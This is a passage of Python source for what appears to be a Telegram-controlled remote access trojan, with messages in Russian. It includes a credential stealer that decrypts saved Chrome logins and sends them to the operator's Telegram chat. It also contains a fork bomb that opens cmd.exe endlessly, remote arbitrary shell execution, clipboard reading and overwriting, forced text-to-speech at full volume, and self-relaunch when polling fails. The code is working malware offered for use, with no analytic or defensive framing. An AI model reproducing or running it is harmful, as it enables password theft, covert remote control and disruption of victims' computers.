  bot.reply_to(command, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(regexp='/Voice')
def voice(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Введите текст\n\n› /Say*', parse_mode="Markdown")

@bot.message_handler(regexp='/Say')
def say(command):
 try:
  from win32com.client import constants, Dispatch
  bot.reply_to(command, '*Воспроизводим...*', parse_mode="Markdown")
  msg = re.split('/Say ', command.text, flags=re.I)[1]
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(
      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
  volume = cast(interface, POINTER(IAudioEndpointVolume))
  volume.SetMasterVolumeLevel(-0.0, None)
  speaker = Dispatch("SAPI.SpVoice")
  speaker.Speak(msg)
  del speaker
  bot.send_message(command.chat.id, '*Готово!*', parse_mode="Markdown")
 except:
  pass

@bot.message_handler(regexp='/ForkBomb')
def forkbomb(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Форкбомба активирована!*', parse_mode="Markdown")
 try:
  while True:
  	os.startfile('cmd.exe')
 except:
  pass

@bot.message_handler(regexp='/Passwords')
def passwords(command):
 try:
  from cryptography.hazmat.backends import default_backend
  from cryptography.hazmat.primitives.ciphers import (
      Cipher, algorithms, modes)

  NONCE_BYTE_SIZE = 12

  def encrypt(cipher, plaintext, nonce):
      cipher.mode = modes.GCM(nonce)
      encryptor = cipher.encryptor()
      ciphertext = encryptor.update(plaintext)
      return (cipher, ciphertext, nonce)

  def decrypt(cipher, ciphertext, nonce):
      cipher.mode = modes.GCM(nonce)
      decryptor = cipher.decryptor()
      return decryptor.update(ciphertext)

  def get_cipher(key):
      cipher = Cipher(
          algorithms.AES(key),
          None,
          backend=default_backend()
      )
      return cipher

  APP_DATA_PATH= os.environ['LOCALAPPDATA']
  DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

  def dpapi_decrypt(encrypted):
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [('cbData', ctypes.wintypes.DWORD),
                      ('pbData', ctypes.POINTER(ctypes.c_char))]

      p = ctypes.create_string_buffer(encrypted, len(encrypted))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      retval = ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
      if not retval:
          raise ctypes.WinError()
      result = ctypes.string_at(blobout.pbData, blobout.cbData)
      ctypes.windll.kernel32.LocalFree(blobout.pbData)
      return result

  def unix_decrypt(encrypted):
      if sys.platform.startswith('linux'):
          password = 'peanuts'
          iterations = 1
      else:
          raise NotImplementedError

      from Crypto.Cipher import AES
      from Crypto.Protocol.KDF import PBKDF2

      salt = 'saltysalt'
      iv = ' ' * 16
      length = 16
      key = PBKDF2(password, salt, length, iterations)
      cipher = AES.new(key, AES.MODE_CBC, IV=iv)
      decrypted = cipher.decrypt(encrypted[3:])
      return decrypted[:-ord(decrypted[-1])]

  def get_key_from_local_state():
      jsn = None
      with open(os.path.join(os.environ['LOCALAPPDATA'],
          r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
          jsn = json.loads(str(f.readline()))
      return jsn["os_crypt"]["encrypted_key"]

  def aes_decrypt(encrypted_txt):
      encoded_key = get_key_from_local_state()
      encrypted_key = base64.b64decode(encoded_key.encode())
      encrypted_key = encrypted_key[5:]
      key = dpapi_decrypt(encrypted_key)
      nonce = encrypted_txt[3:15]
      cipher = get_cipher(key)
      return decrypt(cipher,encrypted_txt[15:],nonce)

  class ChromePassword:
      def __init__(self):
          self.passwordList = []

      def get_chrome_db(self):
          _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
          _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
          if os.path.exists(_temp_path):
              os.remove(_temp_path)
          shutil.copyfile(_full_path,_temp_path)
          self.show_password(_temp_path)

      def show_password(self,db_file):
          conn = sqlite3.connect(db_file)
          _sql = 'select signon_realm,username_value,password_value from logins'
          for row in conn.execute(_sql):
              host = row[0]
              if host.startswith('android'):
                  continue
              name = row[1]
              value = self.chrome_decrypt(row[2])
              _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
              self.passwordList.append(_info)
          conn.close()
          os.remove(db_file)

      def chrome_decrypt(self,encrypted_txt):
          if sys.platform == 'win32':
              try:
                  if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                      decrypted_txt = dpapi_decrypt(encrypted_txt)
                      return decrypted_txt.decode()
                  elif encrypted_txt[:3] == b'v10':
                      decrypted_txt = aes_decrypt(encrypted_txt)
                      return decrypted_txt[:-16].decode()
              except WindowsError:
                  return None
          else:
              try:
                  return unix_decrypt(encrypted_txt)
              except NotImplementedError:
                  return None

      def save_passwords(self):
          with open(os.environ['ProgramData'] + '\\Passwords.txt','w',encoding='utf-8') as f:
              f.writelines(self.passwordList)

  if __name__=="__main__":
      Main = ChromePassword()
      Main.get_chrome_db()
      Main.save_passwords()
      try:
       bot.send_chat_action(command.chat.id, 'upload_document')
       passwords = open(os.environ['ProgramData'] + '\\Passwords.txt')
       bot.send_document(command.chat.id, passwords)
       passwords.close()
       os.remove(os.environ['ProgramData'] + '\\Passwords.txt')
      except:
       pass
 except:
 	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")

@bot.message_handler(regexp='/Clipboard')
def clipboard(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/Clipboard ', command.text, flags=re.I)[1]
  pyperclip.copy(msg)
  bot.send_message(command.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id,
  '*Введите текст'
  '\n'
  '\n› /Clipboard'
  '\n'
  '\nБуфер обмена*'
  '\n'
  '\n« `' + pyperclip.paste() + '` »',
  parse_mode="Markdown")

@bot.message_handler(regexp='/CMD')
def cmd(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  msg = re.split('/CMD ', command.text, flags=re.I)[1]
  ipconfig_res = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
  lines = []
  for line in ipconfig_res.stdout.readlines():
      line = line.strip()
      if line:
          lines.append(line.decode('cp866'))
  bot.send_message(command.chat.id, ('\n'.join(lines)))
 except:
  bot.send_message(command.chat.id, '*Введите команду\n\n› /CMD*', parse_mode="Markdown")

try:
  bot.polling()
except:
  os.startfile(sys.argv[0])
  sys.exit()
